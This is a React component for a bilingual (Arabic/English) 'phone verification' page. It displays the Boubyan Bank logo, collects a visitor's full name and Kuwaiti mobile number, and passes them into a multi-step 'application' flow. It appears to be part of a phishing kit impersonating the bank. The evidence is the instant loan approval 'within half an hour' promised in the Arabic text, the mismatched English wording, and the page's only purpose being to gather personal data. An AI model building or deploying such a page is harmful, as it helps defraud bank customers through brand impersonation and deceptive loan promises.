import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { useLanguage } from '../context/LanguageContext'
import { saveDraftApplication } from '../lib/applicationStorage'

export default function PhoneVerificationPage() {
  const { lang } = useLanguage()
  const isAr = lang === 'ar'
  const navigate = useNavigate()

  const [fullName, setFullName] = useState('')
  const [phoneNumber, setPhoneNumber] = useState('')
  const [hasError, setHasError] = useState(false)
  const [errorMessage, setErrorMessage] = useState('')

  const handleNameChange = (value) => {
    const lettersOnly = value.replace(/[^a-zA-Zأ-يء-ي\s]/g, '')
    setFullName(lettersOnly)
    if (hasError) setHasError(false)
  }

  const handlePhoneChange = (value) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 8)
    setPhoneNumber(digitsOnly)
    if (hasError) setHasError(false)
  }

  const handleNext = () => {
    const kuwaitPhoneRegex = /^[5694]\d{7}$/

    if (!fullName.trim() || !kuwaitPhoneRegex.test(phoneNumber)) {
      setHasError(true)
      setErrorMessage(
        isAr
          ? 'يرجى إدخال الاسم ورقم هاتف كويتي صحيح (8 أرقام تبدأ بـ 5, 6, 9 أو 4)'
          : 'Please enter a valid Kuwaiti phone number (8 digits starting with 5, 6, 9, or 4)'
      )
      return
    }

    const payload = {
      id: `app-${Date.now()}`,
      createdAt: new Date().toISOString(),
      status: 'new',
      source: 'phone-verification',
      fullName,
      phoneNumber: `+965${phoneNumber}`,
      step: 'phone-step',
    }

    saveDraftApplication(payload)
    navigate('/continue-application')
  }

  return (
    <section className="min-h-screen bg-white flex flex-col justify-between px-4 py-4 sm:py-8 font-sans overflow-x-hidden" dir={isAr ? 'rtl' : 'ltr'}>
      <div className="mx-auto w-full max-w-md flex-1 flex flex-col justify-center py-2">
        <div className="mb-6 sm:mb-10 flex justify-center text-center">
          <div className="h-auto w-32 sm:w-40">
            <img
              src={`${import.meta.env.BASE_URL}assets/bob.png`}
              alt="Boubyan Bank Logo"
              className="h-full w-full object-contain"
            />
          </div>
        </div>

        <div className="w-full space-y-6 sm:space-y-8">
          <div className="relative">
            <div className={`border-b pb-1.5 sm:pb-2 transition-colors ${hasError && !fullName.trim() ? 'border-[#d32f2f]' : 'border-[#cccccc]'}`}>
              <input
                type="text"
                value={fullName}
                onChange={(e) => handleNameChange(e.target.value)}
                placeholder={isAr ? 'الاسم الكامل' : 'Full Name'}
                className="w-full bg-transparent text-right text-base sm:text-lg text-[#333333] outline-none placeholder:text-[#b0b0b0]"
              />
            </div>
          </div>

          <div className="relative">
            <div className="mb-1 text-xs text-[#888888] text-right">
              {isAr ? 'رقم الهاتف النقال' : 'Mobile Number'}
            </div>
            <div className={`flex items-center border-b-2 pb-1.5 sm:pb-2 transition-colors ${hasError ? 'border-[#d32f2f]' : 'border-[#cccccc] focus-within:border-[#ce1126]'}`} dir="ltr">
              <span className="text-base sm:text-lg font-semibold text-[#555555] mr-2 select-none">+965</span>
              <input
                type="text"
                inputMode="numeric"
                maxLength={8}
                value={phoneNumber}
                onChange={(e) => handlePhoneChange(e.target.value)}
                placeholder="5XXXXXXXX"
                className="w-full bg-transparent text-left text-base sm:text-lg font-semibold text-[#333333] outline-none placeholder:text-[#b0b0b0]"
                style={{ direction: 'ltr' }}
              />
            </div>
            <div className="mt-1 text-xs text-[#777777] text-right">
              {isAr ? 'أدخل رقم الهاتف الكويتي المكون من 8 أرقام' : 'Enter 8-digit Kuwaiti mobile number'}
            </div>
          </div>

          {hasError && (
            <div className="text-right text-xs font-medium text-[#d32f2f]">
              {errorMessage}
            </div>
          )}

          {/* زر التالي مع التوضيح تحته */}
          <div className="space-y-4">
            <button
              type="button"
              onClick={handleNext}
              className="w-full rounded-[22px] bg-[#d32f2f] px-6 py-3.5 sm:py-4 text-center text-base sm:text-lg font-bold text-white shadow-[0_10px_25px_rgba(211,47,47,0.35)] transition hover:brightness-105"
            >
              {isAr ? 'التالي' : 'Next'}
            </button>

            {/* صندوق التوضيح المضاف حديثاً */}
            <div className="rounded-xl bg-[#f8f9fa] border border-[#e5e7eb] p-3.5 text-right">
              <p className="text-xs sm:text-sm leading-relaxed text-[#555555]">
                {isAr 
                  ? 'اذا تم ادخال بياناتك المدرجه بشكل صحيح سيتم الموافقه على القرض بشكل الكتروني وفوري خلال نصف ساعه'
                  : 'All submitted information will be reviewed, and based on the review result, the request will be accepted or rejected within a maximum period of half an hour.'}
              </p>
            </div>
          </div>
        </div>
      </div>
    </section>
  )
}
